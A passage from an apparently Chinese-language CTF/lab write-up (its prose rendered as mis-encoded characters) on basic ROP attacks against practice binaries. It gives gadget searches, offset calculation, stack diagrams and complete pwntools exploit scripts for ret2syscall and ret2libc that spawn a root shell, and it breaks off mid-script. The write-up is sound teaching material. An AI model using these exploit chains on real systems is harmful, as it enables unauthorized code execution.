æŸ¥çœ‹ç¨‹åºå­—ç¬¦ä¸²ï¼Œèƒ½çœ‹åˆ° `/bin/sh` æˆ‘ä»¬åˆšå¥½å¯ä»¥åˆ©ç”¨\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image6.png)\n\nä½†æ˜¯å› ä¸ºå¼€å¯äº† `NX` æˆ‘ä»¬æ— æ³•å¾€æ ˆä¸Šå†™ï¼Œå†™äº†ä¹Ÿæ— æ³•æ‰§è¡Œï¼Œä¹Ÿä¸å­˜åœ¨`system(\"/bin/sh\")` ä»£ç æ®µï¼Œç¨‹åºæ˜¯é™æ€çš„ï¼Œæ‰€ä»¥ `ret2shellcode` `ret2text` `ret2libc` éƒ½æ— æ³•ä½¿ç”¨ï¼Œä½†æ˜¯å­˜åœ¨`/bin/sh` ä»£ç ç‰‡æ®µï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯• `ret2syscall`\n\né€šè¿‡`ROPgadget` æŸ¥æ‰¾éœ€è¦ç”¨åˆ°å¯„å­˜å™¨æŒ‡ä»¤\n\n`pop eax ; ret` åœ°å€ä¸º `0x080bb196`\n\n```bash\nâœ  ret2syscall ROPgadget --binary ret2syscall --only \"pop|ret\" | grep eax\n0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret\n**0x080bb196 : pop eax ; ret**\n0x0807217a : pop eax ; ret 0x80e\n0x0804f704 : pop eax ; ret 3\n0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret\n```\n\nå‘ç°ä¸€ä¸²è¿ç»­çš„å°†`ebx~edx`å¼¹å‡ºçš„`pop edx ; pop ecx ; pop ebx ; ret` ï¼Œåœ°å€ä¸º`0x0806eb90`\n\n```bash\nâœ  ret2syscall ROPgadget --binary ret2syscall --only \"pop|ret\" | grep ebx\n0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret\n0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret\n0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret\n0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret\n0x080be23f : pop ebx ; pop edi ; ret\n0x0806eb69 : pop ebx ; pop edx ; ret\n0x08092258 : pop ebx ; pop esi ; pop ebp ; ret\n0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10\n0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14\n0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc\n0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4\n0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8\n0x08048913 : pop ebx ; pop esi ; pop edi ; ret\n0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4\n0x08049a94 : pop ebx ; pop esi ; ret\n0x080481c9 : pop ebx ; ret\n0x080d7d3c : pop ebx ; ret 0x6f9\n0x08099c87 : pop ebx ; ret 8\n0x0806eb91 : pop ecx ; pop ebx ; ret\n0x0806336b : pop edi ; pop esi ; pop ebx ; ret\n**0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret**\n```\n\nå‘½ä»¤å­—æ®µ `0x080be408` åœ°å€\n\n```bash\nâœ  ret2syscall ROPgadget --binary ret2syscall --string \"/bin/sh\"         \nStrings information\n============================================================\n0x080be408 : /bin/sh\n```\n\nä¸­æ–­ä»£ç åœ°å€ `0x08049421`\n\n```bash\nâœ  ret2syscall ROPgadget --binary ret2syscall --only \"int\"   \nGadgets information\n============================================================\n0x08049421 : int 0x80\n0x080890b5 : int 0xcf\n```\n\nè®¡ç®—åç§»é‡ï¼Œä¸º`112`\n\n```bash\npwndbg> cyclic 200\naaaabaaacaaa...waabxaabyaab\n\npwndbg> run\nStarting program: /root/Desktop/Test/StackBufferOverFlow/ret2syscall/ret2syscall \nThis time, no system() and NO SHELLCODE!!!\nWhat do you plan to do?\naaaabaaacaaadaaaeaaafaaagaaaabuaabvaabwaabxaabyaab\n\nProgram received signal SIGSEGV, Segmentation fault.                  \n0x62616164 in ?? ()                                                                                               \nLEGEND: STACK | HEAP | CODE | DATA | WX | RODATA                                                                  \nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS / show-flags off / show-compact-regs off ]â”€\n ECX  0xfbad2288                                                                                                  \n EDX  0x80eb4e0 (_IO_stdfile_0_lock) â—‚â€” 0                                                                         \n EDI  0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) â€”â–¸ 0x8067b10 (__stpcpy_sse2) â—‚â€” mov edx, dword ptr [esp + 4]\n ESI  0             \n ESP  0xffffd100 â—‚â€” 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'\n EIP  0x62616164 ('daab')\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / i386 / set emulate on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\nInvalid address 0x62616164\n\npwndbg> cyclic -l daab\nFinding cyclic pattern of 4 bytes: b'daab' (hex: 0x64616162)\nFound at offset 112\n```\n\nä½¿ç”¨ä»£ç å—ç»˜åˆ¶çš„åˆ©ç”¨é“¾\n\n```bash\n           |-----------------------------| é«˜åœ°å€\n           | ...                         |\n           |-----------------------------|\n           | int_0x80_addr               |  <-- ret from pop_..._ret\n           |-----------------------------|\n           | bin_sh_addr                 |  <-- pop into ebx\n           |-----------------------------|\n           | 0x0                         |  <-- pop into ecx\n           |-----------------------------|\n           | 0x0                         |  <-- pop into edx\n           |-----------------------------|\n           | pop_edx_ecx_ebx_ret_addr    |  <-- ret from pop_eax_ret\n           |-----------------------------|\n           | 0xb                         |  <-- pop into eax\n           |-----------------------------|\n           | pop_eax_ret_addr            |  <-- Overwritten return address\n   ebp     |-----------------------------|\n           | ...                         |\n           |-----------------------------|\n   buf ->  | gets buffer start           |\n   esp     |-----------------------------| ä½åœ°å€\n```\n\nç¼–å†™`EXP`\n\n```bash\nfrom pwn import *\n\npop_eax_ret_addr = 0x080bb196\npop_edx_ecx_ebx_addr = 0x0806eb90\nbin_sh_addr = 0x080be408\nint_0x80_addr = 0x08049421\n\nsh = process('./ret2syscall')\nsh.sendline(b'A'*112 + p32(pop_eax_ret_addr) + p32(0xb) + p32(pop_edx_ecx_ebx_addr) + p32(0) + p32(0) + p32(bin_sh_addr) + p32(int_0x80_addr))\nsh.interactive()\n```\n\n```bash\n(pwn) âœ  ret2syscall python exp.py\n[+] Starting local process './ret2syscall': pid 2825\n[*] Switching to interactive mode\nThis time, no system() and NO SHELLCODE!!!\nWhat do you plan to do?\n$ whoami\nroot\n```\n\n## ret2libc\n\n`ret2libc` å³æ§åˆ¶å‡½æ•°çš„æ‰§è¡Œ `libc` ä¸­çš„å‡½æ•°ï¼Œé€šå¸¸æ˜¯è¿”å›è‡³æŸä¸ªå‡½æ•°çš„ `plt` å¤„æˆ–è€…å‡½æ•°çš„å…·ä½“ä½ç½® (å³å‡½æ•°å¯¹åº”çš„ `got` è¡¨é¡¹çš„å†…å®¹)ã€‚\n\nå…¶ä¸­ `libc` æŒ‡çš„æ˜¯`C` æ ‡å‡†åº“ï¼ˆ`standard C library`ï¼‰çš„å®ç°ï¼Œé€šå¸¸æ˜¯ `/lib/x86_64-linux-gnu/libc.so.6` æˆ– `/lib/i386-linux-gnu/libc.so.6`\n\n`libc`åº“æ˜¯`Linux`ä¸‹çš„`C`å‡½æ•°åº“ï¼Œè€Œ`libc`åº“ä¸­å­˜æ”¾çš„å°±æ˜¯è¿™äº›å‡½æ•°çš„åç§»åœ°å€ï¼Œæ‰€ä»¥åªè¦ç¡®å®šäº†`libc`åº“çš„ç‰ˆæœ¬ï¼Œå°±èƒ½çŸ¥é“å‡½æ•°çš„åç§»åœ°å€ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œåœ¨æœ¬åœ°è¿è¡Œçš„æ ·æœ¬ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥å¿½è§†ã€‚\n\n### ret2libc1\n\nä½¿ç”¨ IDA åç¼–è¯‘ï¼Œ`gets`å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image7.png)\n\n`secure` ä¸­çš„ `system`è¢«ä¿®æ”¹äº†ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨`ret2text`\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image8.png)\n\n`32` ä½ç¨‹åºï¼Œå¹¶ä¸”è°ƒç”¨åŠ¨æ€é“¾æ¥åº“\n\n```bash\nâœ  ret2libc file ret2libc1         \nret2libc1: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped\n```\n\n`NX` å¯åŠ¨ï¼Œæ‰€ä»¥`ret2shellcode` ä¹Ÿæ— æ³•ä½¿ç”¨\n\n```bash\nâœ  ret2libc checksec ret2libc1 \n[*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc1'\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n```\n\nå› ä¸ºè¿™é‡Œç”¨äº†åŠ¨æ€é“¾æ¥åº“ï¼Œæ‰€ä»¥ä¼˜å…ˆä½¿ç”¨ `ret2libc`\n\nå­—ç¬¦ä¸²ä¸­èƒ½çœ‹åˆ° `/bin/sh` `08048720`\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image9.png)\n\nå°è¯•å¯»æ‰¾ `system`å‡½æ•°ï¼Œä¹Ÿæ‰¾åˆ°äº†`08048460`\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image10.png)\n\nè®¡ç®—åç§»å€¼ï¼ˆå’Œä¸Šè¾¹ä¸€æ ·çš„æ“ä½œï¼‰\n\n```bash\npwndbg> cyclic -l daab\nFinding cyclic pattern of 4 bytes: b'daab' (hex: 0x64616162)\nFound at offset 112\n```\n\n```bash\n(pwn) âœ  ret2libc cat exp.py \nfrom pwn import *\n\nsystem_plt_addr = 0x08048460\nbin_sh_addr = 0x8048720\nsh = process('./ret2libc1')\nsh.sendline(112 * b'A' + p32(system_plt_addr) + 4 * b'A' + p32(bin_sh_addr))\nsh.interactive()\n```\n\nå¯ä»¥çœ‹åˆ°ä¸ºä»€ä¹ˆè¦åŠ ä¸Š `4 * b'A'` ï¼Œå› ä¸ºè¿™æ˜¯ç»™`system`çš„å‡çš„è¿”å›åœ°å€\n\n```bash\n           | ... higher addresses ...   |\n           +----------------------------+\n           | p32(bin_sh_addr)           | <-- (è¢«æˆ‘ä»¬å†™å…¥) system çš„å‚æ•°\n           +----------------------------+\n           | 4 * b'A' (0x41414141)      | <-- (è¢«æˆ‘ä»¬å†™å…¥) system çš„å‡è¿”å›åœ°å€\n           +----------------------------+\n           | p32(system_plt_addr)       | <-- (è¢«æˆ‘ä»¬å†™å…¥) è¦†ç›–äº† main çš„è¿”å›åœ°å€\n           +----------------------------+\n           | 4 å­—èŠ‚çš„ 'A'               | <-- (è¢«æˆ‘ä»¬å†™å…¥) è¦†ç›–äº† old EBP\n           +----------------------------+\n           | 108 å­—èŠ‚çš„ 'A'             | \\\n           | ...                        |  |\n           | 'A'                        |  } å¡«å……äº†æ•´ä¸ª buffer å’Œé¢å¤–çš„ç©ºé—´\n           | 'A'                        | /\n           +----------------------------+ <-- buffer çš„èµ·å§‹åœ°å€\n           | ... lower addresses ...    |\n```\n\n```bash\n(pwn) âœ  ret2libc python exp.py\n[+] Starting local process './ret2libc1': pid 3166\n[*] Switching to interactive mode\nRET2LIBC >_<\n$ whoami\nroot\n```\n\n### ret2libc2\n\nä¾æ—§æ˜¯ `gets` ï¼Œå­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image11.png)\n\n`checksec`ä»¥åŠæ–‡ä»¶ç±»å‹ï¼Œå’Œ`ret2libc1`åŸºæœ¬æ²¡å·®\n\n```bash\n(pwn) âœ  ret2libc checksec ret2libc1\n[*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc1'\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n(pwn) âœ  ret2libc file ret2libc2         \nret2libc2: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped\n```\n\nå­—ç¬¦ä¸²ä¸­æ‰¾ä¸åˆ° `/bin/sh`äº†\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image12.png)\n\n`system` å‡½æ•°è¿˜åœ¨ `0x08048490`\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image13.png)\n\næ‰€ä»¥éœ€è¦æˆ‘ä»¬æ„é€  `/bin/sh` `0x08048480`\n\nå¯ä»¥çœ‹åˆ°è¿˜å­˜åœ¨`gets` `0x08048460`\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image14.png)\n\næˆ‘ä»¬å¯ä»¥å¤šè°ƒç”¨ä¸€æ¬¡`gadget` ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ‰¾åˆ°ä¸€ç‰‡å¯è¯»å†™çš„ç¼“å†²åŒº\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image15.png)\n\n`buf2`åŒºåŸŸåˆšå¥½å¯ä»¥ `0x0804A080`\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image16.png)\n\næ­¤æ—¶æˆ‘ä»¬è¿˜è¦ä¿æŒå †æ ˆå¹³è¡¡ï¼Œä¹Ÿå°±æ˜¯`gets`æ‰§è¡Œå®Œæ—¶ï¼Œ`gets`çš„è¿”å›åœ°å€ä¼šå¤„äºæ ˆé¡¶ï¼Œä½†æ˜¯æ¥ä¸‹æ¥æˆ‘ä»¬è°ƒç”¨`system`å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨è¿”å›åœ°å€`+4`(å°±æ˜¯è¦æŠŠ`buf`æ¸…ç†æ‰ï¼Œè®©`ROP`é“¾æŒ‡å‘ä¸‹ä¸€æ¡ä¹Ÿå°±æ˜¯`system`)ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥å¯»æ‰¾ `pop xxx ;ret` æˆ–è€… `add esp 4; ret`\n\n```bash\nESP --> | p32(pop_ebx_addr) |  <-- getså‡½æ•°çš„â€œè¿”å›åœ°å€â€\n        +-------------------+\n        |  p32(buf2_addr)   |  <-- getså‡½æ•°çš„å‚æ•°ï¼ˆgetså†™å…¥åï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶å¼¹å‡ºï¼‰\n        +-------------------+\n        | p32(libc_system_addr) |\n        +-------------------+\n        |      b'B'*4       |\n        +-------------------+\n        |  p32(buf2_addr)   |\n        +-------------------+\n```\n\nä½¿ç”¨`ROPgadget`æ¥å¯»æ‰¾`0x0804843d` å°±ç¬¦åˆ\n\n```bash\n(pwn) âœ  ret2libc ROPgadget --binary ret2libc2 --only \"pop|ret\"\nGadgets information\n============================================================\n0x0804872f : pop ebp ; ret\n0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x0804843d : pop ebx ; ret\n```\n\nè®¡ç®—åç§»å€¼ï¼Œä¹Ÿå’Œä¸Šè¾¹ä¸€æ ·æ˜¯`112`\n\n```bash\nfrom pwn import *\n\ngets_plt_addr = 0x08048460\npop_ebx_ret_addr = 0x0804843d\nsystem_plt_addr = 0x08048490\nbuf2 = 0x0804A080\n\nsh = process('./ret2libc2')\nsh.sendline(112 * b'A' + p32(gets_plt_addr) + p32(pop_ebx_ret_addr) + p32(buf2) + p32(system_plt_addr) + 4 * b'A' + p32(buf2))\nsh.sendline('/bin/sh')\nsh.interactive()\n```\n\n```bash\n(pwn) âœ  ret2libc python exp.py   \n[+] Starting local process './ret2libc2': pid 4087\n/root/Desktop/Test/StackBufferOverFlow/ret2libc/exp.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  sh.sendline('/bin/sh')\n[*] Switching to interactive mode\nSomething surprise here, but I don't think it will work.\nWhat do you think ?$ id\nuid=0(root) gid=0(root) ç»„=0(root)\n```\n\n### ret2libc3\n\nä¾æ—§æ˜¯`gets`\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image17.png)\n\nä¿æŠ¤æœºåˆ¶å’Œæ–‡ä»¶ç±»å‹\n\n```bash\nâœ  ret2libc checksec ret2libc3\n[*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\nâœ  ret2libc file ret2libc3\nret2libc3: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, with debug_info, not stripped\n```\n\nå­˜åœ¨`gets`ï¼Œå¯ä»¥ç”¨æ¥æ„é€ `/bin/sh`\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image18.png)\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image19.png)\n\nä½†æ˜¯`system`å‡½æ•°ä¹Ÿæ²¡äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å¯»æ‰¾`system`å‡½æ•°\n\næ‰¾åˆ°`system()`å‡½æ•°å’Œ`/bin/sh`å­—ç¬¦ä¸²åœ¨`libc`ä¸­çš„åœ°å€\n\n- é¦–å…ˆè·å¾—ä¸€ä¸ªå‡½æ•°çš„çœŸå®åœ°å€ï¼Œä¾‹å¦‚ï¼š`__libc_start_main`ï¼Œ`puts`\n- å¾—åˆ°çœŸå®åœ°å€åï¼Œæ ¹æ®æœ€åä¸‰ä½å³å¯å¾—åˆ° libc ç‰ˆæœ¬\n- å¾—åˆ° libc ç‰ˆæœ¬åå°±å¯ä»¥å¾ˆå®¹æ˜“ç¡®å®šè·å¾—çš„çœŸå®å‡½æ•°çš„åç§»åœ°å€ï¼ˆè¿™é‡Œå‡è®¾`puts`ï¼‰\n- è®¡ç®—åŸºåœ°å€ï¼ŒåŸºåœ°å€ = puts å‡½æ•°çœŸå®åœ°å€ - puts å‡½æ•°åç§»åœ°å€\n- å¾—åˆ° libc ç‰ˆæœ¬åè·å– system åœ°å€ä¸ /bin/sh çš„åç§»åœ°å€\n- æ ¹æ® çœŸå®åœ°å€ = åŸºåœ°å€ + åç§»åœ°å€\n- å†æ¬¡æ‰§è¡Œæºç¨‹åº\n- è§¦å‘æ ˆæº¢å‡ºæ‰§è¡Œ `system(â€˜/bin/shâ€™)`\n\nç¼–å†™è„šæœ¬æ³„éœ²`libc_start_main`çš„çœŸå®åœ°å€\n\n```bash\nfrom pwn import *\ne = ELF('./ret2libc3')\nsh = process('./ret2libc3')\nputs_plt_addr = e.plt['puts']\nlibc_start_main_got_addr = e.got['__libc_start_main']\nmain_addr = e.symbols['main']\n\nprint('æ³„éœ² libc_start_main_got_addr å¹¶è¿”å›åˆ° main')\npayload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_got_addr)\nsh.sendlineafter(b'Can you find it !?',payload1)\nlibc_start_main_real_addr = u32(sh.recv()[0:4])\nprint(f\"libc_start_main_real_addr:{hex(libc_start_main_real_addr)}\")\n```\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image20.png)\n\nå†ä¸‹ä¸€æ­¥æˆ‘ä»¬è¦å¾—åˆ° `libc`ç‰ˆæœ¬å’ŒåŸºåœ°å€ä»¥åŠ`system` å‡½æ•°å’Œ`/bin/sh`å­—ç¬¦ä¸²çš„åœ°å€\n\n```bash\nfrom pwn import *\nfrom LibcSearcher import *\ne = ELF('./ret2libc3')\nsh = process('./ret2libc3')\nputs_plt_addr = e.plt['puts']\nlibc_start_main_got_addr = e.got['__libc_start_main']\nmain_addr = e.symbols['main']\n\nprint('æ³„éœ² libc_start_main_got_addr å¹¶è¿”å›åˆ° main')\npayload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_got_addr)\nsh.sendlineafter(b'Can you find it !?',payload1)\nlibc_start_main_real_addr = u32(sh.recv()[0:4])\nprint(f\"libc_start_main_real_addr:{hex(libc_start_main_real_addr)}\")\n\nprint('å¾—åˆ° libc ç‰ˆæœ¬ï¼Œå¹¶è®¡ç®—åŸºåœ°å€å’Œ system & /bin/sh åœ°å€')\nlibc = LibcSearcher(\"__libc_start_main\", libc_start_main_real_addr)\nlibcbase = libc_start_main_real_addr - libc.dump('__libc_start_main')\nsystem_addr = libcbase + libc.dump('system')\nbin_sh_addr = libcbase + libc.dump('/bin/sh')\nprint(f'åŸºåœ°å€:{libcbase},systemåœ°å€:{system_addr},/bin/shåœ°å€:{bin_sh_addr}')\n```\n\nè¿™é‡Œåæ§½ä¸€ä¸‹`LibcSearcher` ï¼Œä¸€ç›´æç¤º`[+] No libc satisfies constraints.` è²Œä¼¼`fork`å¤ªä¹…è¿œäº†æ²¡æ›´æ–°\n\nè¿™é‡Œç›´æ¥é“¾æ¥æœ¬åœ°çš„`libc`åº“äº†ï¼Œä¸ä½¿ç”¨`LibcSearcher`\n\n```bash\nfrom pwn import *\ne = ELF('./ret2libc3')\nlibc = ELF(\"/lib32/libc.so.6\")\nsh = process('./ret2libc3')\nputs_plt_addr = e.plt['puts']\nlibc_start_main_got_addr = e.got['__libc_start_main']\nmain_addr = e.symbols['main']\n\nprint('æ³„éœ² libc_start_main_got_addr å¹¶è¿”å›åˆ° main')\npayload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_got_addr)\nsh.sendlineafter(b'Can you find it !?',payload1)\nlibc_start_main_real_addr = u32(sh.recv()[0:4])\nprint(f\"libc_start_main_real_addr:{hex(libc_start_main_real_addr)}\")\n\nprint('è®¡ç®—åŸºåœ°å€å’Œ system & /bin/sh åœ°å€')\nlibcbase = libc_start_main_real_addr - libc.sym['__libc_start_main']\nsystem_addr = libcbase + libc.sym['system']\nbin_sh_addr = libcbase + next(libc.search(b\"/bin/sh\"))\nprint(f'åŸºåœ°å€:{hex(libcbase)},systemåœ°å€:{hex(system_addr)},/bin/shåœ°å€:{hex(bin_sh_addr)}')\n```\n\næ‰€æœ‰å‚æ•°æˆ‘ä»¬éƒ½æœ‰äº†ï¼Œå°±å¯ä»¥æ„é€ `payload`äº†\n\n1. æ–¹æ¡ˆ `1`ï¼ˆè¿™é‡Œä»¿ç…§`wiki`ä¸Šçš„å†™ï¼‰ï¼š\n    \n    ```bash\n    from pwn import *\n    e = ELF('./ret2libc3')\n    p = process('./ret2libc3')\n    libc = ELF('/lib32/libc.so.6')\n    \n    puts_plt_addr = e.plt['puts']\n    libc_start_main_addr = e.got['__libc_start_main']\n    main_addr = e.symbols['main']\n    payload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_addr)\n    p.sendlineafter(\"Can you find it !?\", payload1)\n    libc_start_main_real_addr = u32(p.recv()[0:4])\n    print(f\"libc_start_main_real_addr = {hex(libc_start_main_real_addr)}\")\n    \n    libcbase = libc_start_main_real_addr - libc.sym['__libc_start_main']\n    print(f\"libcbase = {hex(libcbase)}\")\n    system_real_addr = libcbase + libc.sym['system']\n    print(f\"system_real_addr = {hex(system_real_addr)}\")\n    bin_sh_addr = libcbase + next(libc.search(b\"/bin/sh\"))\n    print(f\"bin_sh_addr = {hex(bin_sh_addr)}\")\n    payload2 = b'A' * 104+ p32(system_real_addr) + b'A' * 4 + p32(bin_sh_addr)\n    p.sendline(payload2)\n    p.interactive()\n    ```\n    \n    è¾“å‡ºï¼ˆå¤±è´¥äº†ï¼‰ï¼š\n    \n    ```bash\n    (pwn) âœ  ret2libc python exp.py\n    [*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'\n        Arch:       i386-32-little\n        RELRO:      Partial RELRO\n        Stack:      No canary found\n        NX:         NX enabled\n        PIE:        No PIE (0x8048000)\n        Stripped:   No\n        Debuginfo:  Yes\n    [+] Starting local process './ret2libc3': pid 4574\n    [*] '/lib32/libc.so.6'\n        Arch:       i386-32-little\n        RELRO:      Full RELRO\n        Stack:      Canary found\n        NX:         NX enabled\n        PIE:        PIE enabled\n    /root/Desktop/Tools/pwn/lib/python3.13/site-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n      res = self.recvuntil(delim, timeout=timeout)\n    libc_start_main_real_addr = 0x206f4e0a\n    libcbase = 0x206d010a\n    system_real_addr = 0x2072232a\n    bin_sh_addr = 0x20896f5c\n    [*] Switching to interactive mode\n    [*] Got EOF while reading in interactive\n    $ id\n    [*] Process './ret2libc3' stopped with exit code -11 (SIGSEGV) (pid 4574)\n    [*] Got EOF while sending in interactive\n    ```\n    \n2. æ–¹æ¡ˆ 2ï¼ˆå¤§ä½¬é€šè¿‡`puts`è€Œä¸æ˜¯`libc_start_main` ï¼Œå¹¶ä¸”äºŒæ¬¡è¿”å›åˆ°çš„æ›´æ—©ä¹‹å‰ï¼‰ï¼š\n    \n    ```bash\n    from pwn import *\n    e = ELF('./ret2libc3')\n    p = process('./ret2libc3')\n    libc = ELF('/lib32/libc.so.6')\n    \n    puts_plt_addr = e.plt['puts']\n    puts_got_addr = e.got['puts']\n    main_addr = e.symbols['_start']\n    payload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(puts_got_addr)\n    p.sendlineafter(\"Can you find it !?\", payload1)\n    puts_real_addr = u32(p.recv()[0:4])\n    print(f\"puts_real_addr = {hex(puts_real_addr)}\")\n    \n    libcbase = puts_real_addr - libc.sym['puts']\n    print(f\"libcbase = {hex(libcbase)}\")\n    system_real_addr = libcbase + libc.sym['system']\n    print(f\"system_real_addr = {hex(system_real_addr)}\")\n    bin_sh_addr = libcbase + next(libc.search(b\"/bin/sh\"))\n    print(f\"bin_sh_addr = {hex(bin_sh_addr)}\")\n    payload2 = b'A' * 112 + p32(system_real_addr) + b'A' * 4 + p32(bin_sh_addr)\n    p.sendline(payload2)\n    p.interactive()\n    ```\n    \n    è¾“å‡ºï¼ˆæˆåŠŸï¼‰ï¼š\n    \n    ```bash\n    (pwn) âœ  ret2libc python exp.py\n    [*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'\n        Arch:       i386-32-little\n        RELRO:      Partial RELRO\n        Stack:      No canary found\n        NX:         NX enabled\n        PIE:        No PIE (0x8048000)\n        Stripped:   No\n        Debuginfo:  Yes\n    [+] Starting local process './ret2libc3': pid 4630\n    [*] '/lib32/libc.so.6'\n        Arch:       i386-32-little\n        RELRO:      Full RELRO\n        Stack:      Canary found\n        NX:         NX enabled\n        PIE:        PIE enabled\n    /root/Desktop/Tools/pwn/lib/python3.13/site-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n      res = self.recvuntil(delim, timeout=timeout)\n    puts_real_addr = 0xf7da72a0\n    libcbase = 0xf7d2b000\n    system_real_addr = 0xf7d7d220\n    bin_sh_addr = 0xf7ef1e52\n    [*] Switching to interactive mode\n    $ id\n    uid=0(root) gid=0(root) ç»„=0(root)\n    ```\n    \n3. æ–¹æ¡ˆ3ï¼Œä¿®å¤`wiki`ä¸Šçš„æ–¹æ¡ˆ\n    \n    ä¸ä½¿ç”¨`__libc_start_main` æ¥è·å–ç¬¬ä¸€ä¸ªçœŸå®åœ°å€ï¼Œè€Œä½¿ç”¨`puts`\n    \n    ```bash\n    (pwn) âœ  ret2libc cat exp.py\n    from pwn import *\n    e = ELF('./ret2libc3')\n    p = process('./ret2libc3')\n    libc = ELF('/lib32/libc.so.6')\n    \n    puts_plt_addr = e.plt['puts']\n    libc_start_main_addr = 